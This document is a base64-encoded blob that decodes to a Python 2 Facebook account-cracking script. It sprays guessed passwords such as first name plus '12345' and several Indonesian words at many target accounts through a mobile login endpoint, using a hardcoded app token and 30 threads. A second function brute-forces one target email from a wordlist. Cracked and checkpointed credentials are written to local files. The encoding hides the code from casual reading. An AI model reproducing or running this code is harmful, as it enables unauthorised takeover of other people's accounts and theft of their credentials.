CQkJCQlwcmludCdceDFiWzE7OTZtW1x4MWJbMTs5Mm1TdWNjZXNzZnVsXHgxYlsxOzU4bV1ceDFiWzE7OTdtICcgKyB1c2VyICsgJyBceDFiWzE7OTZtfFx4MWJbMTs5N20gJyArIHBhc3MyDQoJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczIpDQoJCQkJCWVsc2U6DQoJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQogICAgICAgIA0KCQkJCQkJCXByaW50J3vDl30nICsgdXNlciArICcgXHgxYlsxOzk2bXxceDFiWzE7OTdtICcgKyBwYXNzMg0KCQkJCQkJCWNlayA9IG9wZW4oIm91dC9jaGVja3BvaW50LnR4dCIsICJhIikNCgkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczIrIlxuIikNCgkJCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MyKQ0KCQkJCQkJZWxzZToNCgkJCQkJCQlwYXNzMyA9IGJbJ2ZpcnN0X25hbWUnXSArICcxMjM0NScNCgkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzMykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQogICAgICAgIA0KCQkJCQkJCQlwcmludCdceDFiWzE7OTZtW1x4MWJbMTs5Mm1IYWNrIFN1Y2Nlc3NmdWxceDFiWzE7NThtXVx4MWJbMTs5N20gJyArIHVzZXIgKyAnIFx4MWJbMTs5Nm18XHgxYlsxOzk3bSAnICsgcGFzczMNCgkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MzKQ0KCQkJCQkJCWVsc2U6DQoJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCiAgICAgICAgDQoJCQkJCQkJCQlwcmludCd7w5d9JyArIHVzZXIgKyAnIFx4MWJbMTs5Nm18XHgxYlsxOzk3bSAnICsgcGFzczMNCgkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9jaGVja3BvaW50LnR4dCIsICJhIikNCgkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzMysiXG4iKQ0KCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MzKQ0KCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJcGFzczQgPSAnU2F5YW5nJw0KCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczQpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCiAgICAgICANCgkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzk2bVtceDFiWzE7OTJtSGFjayBTdWNjZXNzZnVsXHgxYlsxOzk2bV1ceDFiWzE7NThtICcgKyB1c2VyICsgJyBceDFiWzE7OTZtfFx4MWJbMTs5N20gJyArIHBhc3M0DQoJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M0KQ0KCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQogICAgICAgIA0KCQkJCQkJCQkJCQlwcmludCd7w5d9JyArIHVzZXIgKyAnIFx4MWJbMTs5Nm18XHgxYlsxOzk3bSAnICsgcGFzczQNCgkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczQrIlxuIikNCgkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczQpDQoJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJcGFzczUgPSAnQmFuZ3NhdCcNCgkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQogICAgICAgIA0KCQkJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5Nm1bXHgxYlsxOzIwbUhhY2sgU3VjY2Vzc2Z1bFx4MWJbMTs5Nm1dXHgxYlsxOzk3bSAnICsgdXNlciArICcgXHgxYlsxOzU4bXxceDFiWzE7OTdtICcgKyBwYXNzNQ0KCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M1KQ0KCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KICAgICAgICANCgkJCQkJCQkJCQkJCQlwcmludCAne8OXfScgKyB1c2VyICsgJyBceDFiWzE7NThtfFx4MWJbMTs5N20gJyArIHBhc3M2DQoJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNSsiXG4iKQ0KCQkJCQkJCQkJCQkJCWNlay5jbG9zZSgpDQoJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczUpDQoJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCXBhc3M2ID0gJ0tvbnRvbCcNCgkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQogICAgICAgIA0KCQkJCQkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzk2bVtceDFiWzE7MjBtSGFjayBTdWNjZXNzZnVsXHgxYlsxOzk2bV1ceDFiWzE7OTdtICcgKyB1c2VyICsgJyBceDFiWzE7NThtfFx4MWJbMTs5N20gJyArIHBhc3M2DQoJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNikNCgkJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQogICAgICANCgkJCQkJCQkJCQkJCQkJCXByaW50J3vDl30nICsgdXNlciArICcgXHgxYlsxOzU4bXxceDFiWzE7OTdtICcgKyBwYXNzNg0KCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3M2KyJcbiIpDQoJCQkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczYpDQoJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQlhID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK3VzZXIrJy8/YWNjZXNzX3Rva2VuPScrdG9rZXQpDQoJCQkJCQkJCQkJCQkJCQliID0ganNvbi5sb2FkcyhhLnRleHQpDQoJCQkJCQkJCQkJCQkJCQlwYXNzNyA9ICdBbmppbmcnDQoJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KICAgICAgIA0KCQkJCQkJCQkJCQkJCQkJCXByaW50ICdceDFiWzE7OTZtW1x4MWJbMTsyMG1IYWNrIFN1Y2Nlc3NmdWxceDFiWzE7OTZtXVx4MWJbMTs5N20gJyArIHVzZXIgKyAnIFx4MWJbMTs1OG18XHgxYlsxOzk3bSAnICsgcGFzczcNCgkJCQkJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczcpDQoJCQkJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCiAgICAgICAgDQoJCQkJCQkJCQkJCQkJCQkJCXByaW50J3vDl30nICsgdXNlciArICcgXHgxYlsxOzU4bXxceDFiWzE7OTdtICcgKyBwYXNzNw0KCQkJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvY2hlY2twb2ludC50eHQiLCAiYSIpDQoJCQkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNysiXG4iKQ0KCQkJCQkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQkJCQkJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzNykNCgkJCQkJCQkJCQkJCQkJCQkJDQoJCQkJCQkJCQkJCQkJCQkNCgkJZXhjZXB0Og0KCQkJcGFzcw0KCQkNCglwID0gVGhyZWFkUG9vbCgzMCkNCglwLm1hcChtYWluLCBpZCkNCglwcmludCAnXDAzM1sxOzkzbVByb2Nlc3MgSGFzIEJlZW4gQ29tcGxldGVkJw0KCXByaW50IlwwMzNbMTs5MW1Ub3RhbCBPSy9ceDFiWzE7OTVtQ1AgXDAzM1sxOzkzbTogXDAzM1sxOzkxbSIrc3RyKGxlbihva3MpKSsiXDAzM1sxOzkzbS9cMDMzWzE7OTZtIitzdHIobGVuKGNla3BvaW50KSkNCglwcmludCANCglyYXdfaW5wdXQoIlxuXDAzM1sxOzk1bVtcMDMzWzE7OTFtQmFja1wwMzNbMTs5NW1dIikNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgkNCmRlZiBicnV0ZSgpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHRyeToNCiAgICAgICAgdG9rZXQgPSBvcGVuKCdsb2dpbi50eHQnLCAncicpLnJlYWQoKQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBwcmludCAnXDAzM1sxOzk3bVshXSBUb2tlbiBub3QgZm91bmQnDQogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQogICAgICAgIHRpbWUuc2xlZXAoMC41KQ0KICAgICAgICBsb2dpbigpDQogICAgZWxzZToNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIHByaW50IGxvZ28NCiAgICAgICAgcHJpbnQNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZW1haWwgPSByYXdfaW5wdXQoJ1wwMzNbMTs5N21bK10gXDAzM1sxOzk3bUlEXDAzM1sxOzk3bS9cMDMzWzE7OTdtRW1haWwgXDAzM1sxOzk3bVRhcmdldCBcMDMzWzE7OTdtOlwwMzNbMTs5N20gJykNCiAgICAgICAgICAgIHBhc3N3ID0gcmF3X2lucHV0KCdcMDMzWzE7OTdtWytdIFwwMzNbMTs5N21Xb3JkbGlzdCBcMDMzWzE7OTdtZXh0KHdvcmQudHh0KSBcMDMzWzE7OTdtOiBcMDMzWzE7OTdtJykNCiAgICAgICAgICAgIHRvdGFsID0gb3BlbihwYXNzdywgJ3InKQ0KICAgICAgICAgICAgdG90YWwgPSB0b3RhbC5yZWFkbGluZXMoKQ0KICAgICAgICAgICAgcHJpbnQgDQogICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtcMDMzWzE7OTdtXHhlMlx4OWNceDkzXDAzM1sxOzk3bV0gXDAzM1sxOzk3bVRhcmdldCBcMDMzWzE7OTdtOlwwMzNbMTs5N20gJyArIGVtYWlsDQogICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVsrXSBcMDMzWzE7OTdtVG90YWxcMDMzWzE7OTdtICcgKyBzdHIobGVuKHRvdGFsKSkgKyAnIFwwMzNbMTs5N21QYXNzd29yZCcNCiAgICAgICAgICAgIGphbGFuKCdcMDMzWzE7OTdtW1x4ZTJceDljXHhiYV0gXDAzM1sxOzk3bVBsZWFzZSB3YWl0IFwwMzNbMTs5N20uLi4nKQ0KICAgICAgICAgICAgc2FuZGkgPSBvcGVuKHBhc3N3LCAncicpDQogICAgICAgICAgICBmb3IgcHcgaW4gc2FuZGk6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBwdyA9IHB3LnJlcGxhY2UoJ1xuJywgJycpDQogICAgICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoJ1xyXDAzM1sxOzk3bVtcMDMzWzE7OTdtXHhlMlx4OWNceGI4XDAzM1sxOzk3bV0gXDAzM1sxOzk3bVRyeSBcMDMzWzE7OTdtJyArIHB3KQ0KICAgICAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyBlbWFpbCArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwdyArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQ0KICAgICAgICAgICAgICAgICAgICBtcHNoID0ganNvbi5sb2FkcyhkYXRhLnRleHQpDQogICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIG1wc2g6DQogICAgICAgICAgICAgICAgICAgICAgICBkYXBhdCA9IG9wZW4oJ0JydXRlLnR4dCcsICd3JykNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhcGF0LndyaXRlKGVtYWlsICsgJyB8ICcgKyBwdyArICdcbicpDQogICAgICAgICAgICAgICAgICAgICAgICBkYXBhdC5jbG9zZSgpDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXG5cMDMzWzE7OTdtWytdIFwwMzNbMTs5N21Gb3VuZGVkLicNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IDUyICogJ1wwMzNbMTs5N21ceGUyXHg5NVx4OTAnDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtceGUyXHg5ZVx4YjldIFwwMzNbMTs5N21Vc2VybmFtZSBcMDMzWzE7OTdtOlwwMzNbMTs5N20gJyArIGVtYWlsDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtceGUyXHg5ZVx4YjldIFwwMzNbMTs5N21QYXNzd29yZCBcMDMzWzE7OTdtOlwwMzNbMTs5N20gJyArIHB3DQogICAgICAgICAgICAgICAgICAgICAgICBrZWx1YXIoKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIG1wc2hbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNla3MgPSBvcGVuKCdCcnV0ZWNla3BvaW50LnR4dCcsICd3JykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZWtzLndyaXRlKGVtYWlsICsgJyB8ICcgKyBwdyArICdcbicpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2Vrcy5jbG9zZSgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1xuXDAzM1sxOzk3bVsrXSBcMDMzWzE7OTdtRm91bmRlZC4nDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMTs5N21bIV0gXDAzM1sxOzk3bUFjY291bnQgTWF5YmUgQ2hlY2twb2ludCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtceGUyXHg5ZVx4YjldIFwwMzNbMTs5N21Vc2VybmFtZSBcMDMzWzE7OTdtOlwwMzNbMTs5N20gJyArIGVtYWlsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1wwMzNbMTs5N21bXHhlMlx4OWVceGI5XSBcMDMzWzE7OTdtUGFzc3dvcmQgXDAzM1sxOzk3bTpcMDMzWzE7OTdtICcgKyBwdw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtlbHVhcigpDQogICAgICAgICAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVshXSBDb25uZWN0aW9uIEVycm9yJw0KICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpDQoNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVshXSBGaWxlIG5vdCBmb3VuZC4uLicNCiAgICAgICAgICAgIHByaW50ICIiIlxuXDAzM1sxOzk3bVshXSBcMDMzWzE7OTdtTG9va3MgbGlrZSB5b3UgZG9uJ3QgaGF2ZSBhIHdvcmRsaXN0IiIiDQogICAgICAgICAgICBzdXBlcigpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQoJbG9naW4oKQ0K'))